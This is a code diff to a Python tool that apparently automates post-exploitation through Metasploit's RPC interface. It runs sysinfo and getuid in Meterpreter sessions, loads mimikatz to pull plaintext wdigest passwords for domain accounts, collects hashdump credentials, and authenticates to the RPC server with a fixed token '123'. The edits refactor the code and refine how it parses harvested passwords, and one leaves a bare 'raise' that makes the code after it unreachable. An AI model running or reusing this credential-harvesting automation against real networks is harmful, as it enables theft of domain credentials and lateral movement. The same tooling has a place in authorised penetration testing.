@@ -96,21 +96,21 @@ async def get_shell_info(client, sess_num):
 
     print_info('Getting session data', sess_num)
 
-    sysinfo_cmd = 'sysinfo'
-    sysinfo_end_strs = [b'Meterpreter     : ']
+    cmd = 'sysinfo'
+    end_strs = [b'Meterpreter     : ']
 
-    sysinfo_output, err = await run_session_cmd(client, sess_num, sysinfo_cmd, sysinfo_end_strs)
+    output, err = await run_session_cmd(client, sess_num, cmd, end_strs)
     if err:
         print_bad('Session appears to be broken', sess_num)
         return [b'ERROR']
 
     else:
-        sysinfo_split = sysinfo_output.splitlines()
+        sysinfo_split = output.splitlines()
 
-    getuid_cmd = 'getuid'
-    getuid_end_strs = [b'Server username:']
+    cmd = 'getuid'
+    end_strs = [b'Server username:']
 
-    getuid_output, err = await run_session_cmd(client, sess_num, getuid_cmd, getuid_end_strs)
+    getuid_output, err = await run_session_cmd(client, sess_num, cmd, end_strs)
     if err:
         print_bad('Session appears to be dead', sess_num)
         return [b'ERROR']
@@ -391,25 +391,44 @@ def update_session(session, sess_num):
 async def run_mimikatz(client, sess_num):
     global DOMAIN_DATA
 
-    load_mimi_cmd = 'load mimikatz'
-    load_mimi_end_strs = [b'Success.', b'has already been loaded.']
-    load_mimi_output, err = await run_session_cmd(client, sess_num, load_mimi_cmd, load_mimi_end_strs)
+    cmd = 'load mimikatz'
+    end_strs = [b'Success.', b'has already been loaded.']
+    output, err = await run_session_cmd(client, sess_num, cmd, end_strs)
     if err:
         return
-    wdigest_cmd = 'wdigest'
-    wdigest_end_strs = [b'    Password']
-    mimikatz_output, err = await run_session_cmd(client, sess_num, wdigest_cmd, wdigest_end_strs)
+    cmd = 'wdigest'
+    end_strs = [b'    Password']
+    output, err = await run_session_cmd(client, sess_num, cmd, end_strs)
     if err:
         return 
     else:
-        mimikatz_split = mimikatz_output.splitlines()
+        mimikatz_split = output.splitlines()
         for l in mimikatz_split:
+
             if l.startswith(b'0;'):
                 line_split = l.split(None, 4)
+
+                # Output may include accounts without a password?
+                # Here's what I've seen that causes problems:
+                #ob'AuthID        Package    Domain        User               Password'
+                #b'------        -------    ------        ----               --------'
+                #b'0;1299212671  Negotiate  IIS APPPOOL   DefaultAppPool     '
+                #b'0;995         Negotiate  NT AUTHORITY  IUSR               '
+                #b'0;997         Negotiate  NT AUTHORITY  LOCAL SERVICE      '
+                #b'0;41167       NTLM                                        '
+
+                if len(line_split) < 5:
+                    continue
+
                 dom = line_split[2]
                 if dom.lower() == NEW_SESS_DATA[sess_num][b'domain'].lower():
                     dom_user = '{}\{}'.format(dom.decode('utf8'), line_split[3].decode('utf8'))
                     password = line_split[4]
+
+                    # Check if it's just some hex shit that we can't use
+                    if password.count(b' ') > 200:
+                        continue
+
                     if b'wdigest KO' not in password:
                         creds = '{}:{}'.format(dom_user, password.decode('utf8'))
                         if creds not in DOMAIN_DATA['creds']:
@@ -476,7 +495,7 @@ async def run_hashdump(client, sess_num):
         l = l.strip().decode('utf8')
         if l not in DOMAIN_DATA['creds']:
             DOMAIN_DATA['creds'].append(l)
-            msg = 'Creds found through hashdump: '+l
+            msg = 'Hashdump creds - '+l
             print_great(msg, sess_num)
 
 async def attack(client, sess_num):
@@ -543,7 +562,7 @@ def get_output(client, cmd, sess_num):
     else:
         return (None, cmd)
 
-def get_output_errors(output):
+def get_output_errors(output, cmd):
     global NEW_SESS_DATA
 
     script_errors = [b'[-] post failed', 
@@ -553,7 +572,8 @@ def get_output_errors(output):
                      b'operation timed out',
                      b'unknown session id',
                      b'error running',
-                     b'failed to load extension']
+                     b'failed to load extension',
+                     b'requesterror']
     err = None
 
     # Got an error from output
@@ -613,7 +633,7 @@ async def run_session_cmd(client, sess_num, cmd, end_strs, timeout=30):
                     break
 
                 # Check for errors from cmd's output
-                err = get_output_errors(full_output)
+                err = get_output_errors(full_output, cmd)
                 if err:
                     NEW_SESS_DATA[sess_num][b'errors'].append(err)
                     print_bad(err, sess_num)
@@ -639,6 +659,7 @@ async def run_session_cmd(client, sess_num, cmd, end_strs, timeout=30):
 
         # This usually occurs when the session suddenly dies or user quits it
         except Exception as e:
+            raise
             err = 'exception below likely due to abrupt death of session'
             print_bad(error_msg.format(sess_num_str, err), sess_num)
             print_bad('    '+str(e), None)
@@ -658,7 +679,10 @@ async def run_session_cmd(client, sess_num, cmd, end_strs, timeout=30):
     
 def get_perm_token(client):
     # Authenticate and grab a permanent token
-    client.login(args.username, args.password)
+    try:
+        client.login(args.username, args.password)
+    except msfrpc.MsfAuthError:
+        print_bad('Authentication to the MSF RPC server failed, are you sure you have the right password?')
     client.call('auth.token_add', ['123'])
     client.token = '123'
     return client
